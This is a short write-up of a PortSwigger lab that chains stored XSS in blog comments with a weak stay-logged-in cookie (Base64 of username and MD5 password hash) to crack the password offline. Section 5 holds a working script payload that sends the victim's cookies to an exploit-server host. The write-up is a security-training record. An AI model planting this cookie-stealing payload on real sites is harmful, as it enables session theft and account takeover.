# Challenge Name:  Offline password cracking
# Platform: PortSwigger
# Difficulty: Practitioner

## 1. Vulnerability Type
Stored XSS / Weak Cookie / Offline Password Cracking
## 2. Root Cause
The application is vulnerable to stored XSS and uses a weak `stay-logged-in` cookie that stores Base64(username:md5(password)).

Because the cookie contains a password hash without secure protection, an attacker can steal the cookie using XSS and perform offline password cracking.
## 3. Attack Surface
`/post?postId=`

## 4. Exploit Method
The comment functionality is vulnerable to stored XSS.

The application also uses a `stay-logged-in` cookie that contains Base64(username:md5(password)).

The attacker injects a malicious script into a comment that sends the victim's cookies to the exploit server.

After receiving the cookie, the attacker decodes the Base64 value to obtain the MD5 hash of the password.

The hash can then be cracked offline using a password list, allowing the attacker to log in as the victim.
## 5. Payload / Technique
Stored XSS was used to send the victim's cookie to the exploit server.
```bash
<script>document.location='https://exploit-0af5001404e228d780b9075901d500b7.exploit-server.net/exploit'+document.cookie</script>
```

## 6. Impact
An attacker can steal authentication cookies and crack password hashes offline, leading to account takeover.
## 7. Reusable Pattern
When testing applications, check whether multiple vulnerabilities can be chained together, such as XSS combined with weak authentication mechanisms.
## 8. Key Takeaway
Sensitive data must not be stored in cookies without proper protection, and user input must be sanitized to prevent XSS that could expose authentication tokens.

